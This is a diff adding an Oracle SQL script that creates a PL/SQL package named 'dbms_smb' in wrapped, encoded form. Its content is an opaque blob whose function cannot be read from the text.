@@ -1,0 +1,33 @@
+CREATE OR REPLACE PACKAGE dbms_smb wrapped 
+a000000
+1
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+9
+d73 2ad
+o1tCf8zuv0fYprYLYaMhiBndaVowg9ecrq6GfC+V/m6uf5xcbQ7TmIDFy7YS7CP20Na1jlfp
+5hJD2/6cPN4WJ6gx3xg1VCtclZtyIIfolt7w4NaUr5qwwZyLQzq9fEAN8cpRx9tr9EF2Dpae
+qSnHlJM2AYjFntc8x4aElEt+NC1OmOOjO476c+lghA4EcG3c2LNzvFo2gKh7OUroFMRW3Nnl
+kJQUjO8v9tMT9cMxd9x5wd47TFwFxNYzwd3XYkdpq5WXB8PtnetwyLcMG63hYeSEZkcl+W0B
+EvlaH0oqrRVnZJRyqBAR/NL1hmc9XPtqjAURu636EJ0tYgeMPLD7vGAtJLxbfDSdggbHwTj4
+FJAT6utwyyJwY1MnIlO/4qrGqR0fxpJ1e2OT7wwuLKfUNwnQpB9l5+xzbpCPRsaSdP+IjUQj
+53PKa3m++D8JUOLuO9b6rNheXP3LF6xwdaJoGZ9YN0bmaaQjzO+h1YFQZBEh+lSIKq/1ai34
+KS5b9IkwjTLQXhK6VAvDEW7t/gBuub2zDV1kHh6oWZqCRLxll2YXywNfUqd/UJvpo9Rp2R/2
+iNZiF6BDdMRuCKeCj2VgcdTI2R/HeSI9e+11suPFOz1GNPYlj2ayZ/lOmzz9N22VAWEtVM85
+pXk/EiZELTaTq5r5+FT5zlvqoUxc
+
+/
+show errors
